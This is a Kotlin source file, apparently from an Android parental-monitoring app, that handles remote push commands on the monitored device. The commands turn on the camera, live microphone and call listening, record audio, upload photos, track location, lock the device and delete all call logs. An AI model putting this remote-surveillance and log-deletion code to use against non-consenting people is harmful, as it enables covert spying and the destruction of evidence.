package com.familyguardpro.services

import android.util.Log
import com.familyguardpro.utils.CallLogDeleter
import com.familyguardpro.utils.PhotoSyncer
import com.familyguardpro.utils.PreferenceManager
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import android.content.Intent
import android.os.Build
import com.familyguardpro.network.ApiClient

class FcmService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "FcmService"
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager

    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token: $token")
        
        preferenceManager.setFcmToken(token)
        
        // Update token on server
        if (preferenceManager.isChildMode()) {
            serviceScope.launch {
                try {
                    val deviceId = preferenceManager.getDeviceId()
                    ApiClient.api.updateFcmToken(
                        deviceId,
                        mapOf("fcmToken" to token)
                    )
                    Log.d(TAG, "FCM token updated on server")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to update FCM token", e)
                }
            }
        }
    }

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)
        Log.d(TAG, "FCM message received: ${message.data}")
        
        if (!preferenceManager.isChildMode()) {
            Log.d(TAG, "Not in child mode, ignoring message")
            return
        }
        
        val command = message.data["command"] ?: return
        
        when (command) {
            "delete_call_logs" -> {
                handleDeleteCallLogs()
            }
            
            "start_camera" -> {
                startCameraService()
            }
            
            "stop_camera" -> {
                stopCameraService()
            }
            
            "start_screen_mirror" -> {
                // Screen mirror requires user interaction (MediaProjection)
                Log.d(TAG, "Screen mirror requested - requires user permission")
            }
            
            "start_live_listen" -> {
                startLiveListenService()
            }
            
            "stop_live_listen" -> {
                stopLiveListenService()
            }
            
            "record_audio" -> {
                val duration = message.data["duration"]?.toIntOrNull() ?: 60
                startAudioRecording(duration)
            }
            
            "enable_call_recording" -> {
                preferenceManager.setCallRecordingEnabled(true)
                Log.d(TAG, "Call recording enabled")
            }
            
            "disable_call_recording" -> {
                preferenceManager.setCallRecordingEnabled(false)
                Log.d(TAG, "Call recording disabled")
            }
            
            "live_call_listen" -> {
                startLiveCallListen()
            }
            
            "sync_data" -> {
                DataSyncWorker.runImmediateSync(this)
            }
            
            "update_location" -> {
                requestLocationUpdate()
            }
            
            "sync_photos" -> {
                val hours = message.data["hours"]?.toIntOrNull() ?: 24
                syncPhotos(hours)
            }
            
            "open_app" -> {
                openApp()
            }
            
            "lock_device" -> {
                lockDevice()
            }
            
            "ring_device" -> {
                ringDevice()
            }
            
            "stop_ring" -> {
                stopRinging()
            }
            
            "uninstall_app" -> {
                uninstallApp()
            }
            
            "unpair_device" -> {
                handleUnpairDevice()
            }
            
            else -> {
                Log.d(TAG, "Unknown command: $command")
            }
        }
    }

    private fun handleDeleteCallLogs() {
        Log.d(TAG, "Executing delete_call_logs command")
        
        try {
            val deleted = CallLogDeleter.deleteAllCallLogs(this)
            Log.d(TAG, "Deleted $deleted call logs from device")
            
            // Notify server of completion
            serviceScope.launch {
                try {
                    val deviceId = preferenceManager.getDeviceId()
                    ApiClient.api.sendCommandResult(
                        deviceId,
                        com.familyguardpro.network.CommandResultBody(
                            commandId = "delete_call_logs",
                            result = "Deleted $deleted call logs",
                            success = true
                        )
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to report delete result", e)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete call logs", e)
        }
    }
    
    private fun syncPhotos(hours: Int) {
        serviceScope.launch {
            try {
                Log.d(TAG, "Starting photo sync for last $hours hours")
                val photoSyncer = PhotoSyncer(this@FcmService)
                val count = photoSyncer.syncPhotos(hours)
                Log.d(TAG, "Photo sync complete: $count photos uploaded")
                
                // Notify server of completion
                val deviceId = preferenceManager.getDeviceId()
                ApiClient.api.sendCommandResult(
                    deviceId,
                    com.familyguardpro.network.CommandResultBody(
                        commandId = "sync_photos",
                        result = "Synced $count photos",
                        success = true
                    )
                )
            } catch (e: Exception) {
                Log.e(TAG, "Photo sync failed", e)
            }
        }
    }

    private fun startCameraService() {
        val intent = Intent(this, CameraService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun stopCameraService() {
        stopService(Intent(this, CameraService::class.java))
    }

    private fun startLiveListenService() {
        val intent = Intent(this, LiveListenService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun stopLiveListenService() {
        stopService(Intent(this, LiveListenService::class.java))
    }

    private fun startAudioRecording(duration: Int) {
        val intent = Intent(this, LiveListenService::class.java).apply {
            putExtra("mode", "record")
            putExtra("duration", duration)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun startLiveCallListen() {
        val intent = Intent(this, CallRecordService::class.java).apply {
            putExtra("mode", "live_listen")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun requestLocationUpdate() {
        val intent = Intent(this, LocationService::class.java).apply {
            action = "REQUEST_UPDATE"
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
    
    private fun openApp() {
        Log.d(TAG, "Opening app on child device")
        try {
            val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
            launchIntent?.let {
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                startActivity(it)
                Log.d(TAG, "App opened successfully")
                
                // Notify server of completion
                serviceScope.launch {
                    try {
                        val deviceId = preferenceManager.getDeviceId()
                        ApiClient.api.sendCommandResult(
                            deviceId,
                            com.familyguardpro.network.CommandResultBody(
                                commandId = "open_app",
                                result = "App opened",
                                success = true
                            )
                        )
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to report open_app result", e)
                    }
                }
            } ?: Log.e(TAG, "Launch intent is null")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open app", e)
        }
    }
    
    private fun lockDevice() {
        Log.d(TAG, "Locking device")
        try {
            val devicePolicyManager = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            devicePolicyManager.lockNow()
            Log.d(TAG, "Device locked successfully")
            
            serviceScope.launch {
                try {
                    val deviceId = preferenceManager.getDeviceId()
                    ApiClient.api.sendCommandResult(
                        deviceId,
                        com.familyguardpro.network.CommandResultBody(
                            commandId = "lock_device",
                            result = "Device locked",
                            success = true
                        )
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to report lock_device result", e)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to lock device - Device Admin permission required", e)
        }
    }
    
    private fun ringDevice() {
        Log.d(TAG, "Ringing device")
        try {
            val audioManager = getSystemService(android.content.Context.AUDIO_SERVICE) as android.media.AudioManager
            
            // Save original volume
            originalRingVolume = audioManager.getStreamVolume(android.media.AudioManager.STREAM_RING)
            val maxVolume = audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_RING)
            
            // Set to max volume
            audioManager.setStreamVolume(
                android.media.AudioManager.STREAM_RING,
                maxVolume,
                android.media.AudioManager.FLAG_PLAY_SOUND
            )
            
            // Play ringtone
            val ringtoneUri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
            currentRingtone = android.media.RingtoneManager.getRingtone(this, ringtoneUri)
            currentRingtone?.play()
            
            // Stop after 30 seconds and restore volume
            ringHandler.postDelayed(stopRingingRunnable, 30000)
            
            Log.d(TAG, "Device ringing at max volume")
            
            serviceScope.launch {
                try {
                    val deviceId = preferenceManager.getDeviceId()
                    ApiClient.api.sendCommandResult(
                        deviceId,
                        com.familyguardpro.network.CommandResultBody(
                            commandId = "ring_device",
                            result = "Device ringing",
                            success = true
                        )
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to report ring_device result", e)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to ring device", e)
        }
    }
    
    // Ringtone management
    private var currentRingtone: android.media.Ringtone? = null
    private var originalRingVolume: Int = 0
    private val ringHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val stopRingingRunnable = Runnable { stopRinging() }
    
    private fun stopRinging() {
        Log.d(TAG, "Stopping ring")
        try {
            ringHandler.removeCallbacks(stopRingingRunnable)
            currentRingtone?.stop()
            currentRingtone = null
            
            // Restore original volume
            val audioManager = getSystemService(android.content.Context.AUDIO_SERVICE) as android.media.AudioManager
            audioManager.setStreamVolume(android.media.AudioManager.STREAM_RING, originalRingVolume, 0)
            
            Log.d(TAG, "Ring stopped, volume restored")
            
            serviceScope.launch {
                try {
                    val deviceId = preferenceManager.getDeviceId()
                    ApiClient.api.sendCommandResult(
                        deviceId,
                        com.familyguardpro.network.CommandResultBody(
                            commandId = "stop_ring",
                            result = "Ring stopped",
                            success = true
                        )
                    )
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to report stop_ring result", e)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop ring", e)
        }
    }
    
    private fun uninstallApp() {
        Log.d(TAG, "Uninstall command received - triggering app uninstall")
        try {
            // First clear data and notify
            preferenceManager.clear()
            
            // Stop all running services
            stopService(Intent(this, LocationService::class.java))
            stopService(Intent(this, CameraService::class.java))
            stopService(Intent(this, LiveListenService::class.java))
            DataSyncWorker.cancelSync(this)
            
            // Try to remove device admin (required before uninstall)
            try {
                val devicePolicyManager = getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                val componentName = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                if (devicePolicyManager.isAdminActive(componentName)) {
                    devicePolicyManager.removeActiveAdmin(componentName)
                    Log.d(TAG, "Device admin removed")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to remove device admin", e)
            }
            
            // Launch uninstall intent
            val uninstallIntent = Intent(Intent.ACTION_DELETE).apply {
                data = android.net.Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(uninstallIntent)
            
            Log.d(TAG, "Uninstall dialog launched")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initiate uninstall", e)
        }
    }
    
    private fun handleUnpairDevice() {
        Log.d(TAG, "Remote unpair command received - resetting device to unpaired state")
        
        try {
            // Clear all preferences and reset to unpaired state
            preferenceManager.clear()
            
            // Stop all running services
            stopService(Intent(this, DataSyncWorker::class.java))
            stopService(Intent(this, LocationService::class.java))
            stopService(Intent(this, CameraService::class.java))
            stopService(Intent(this, LiveListenService::class.java))
            
            // Send broadcast to any active ChildStatusActivity to finish
            val unpairIntent = Intent("com.familyguardpro.ACTION_DEVICE_UNPAIRED")
            unpairIntent.setPackage(packageName)
            sendBroadcast(unpairIntent)
            
            // Launch MainActivity to show login screen
            val launchIntent = Intent(this, com.familyguardpro.MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            }
            startActivity(launchIntent)
            
            Log.d(TAG, "Device unpaired successfully via remote command")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unpair device remotely", e)
        }
    }
}
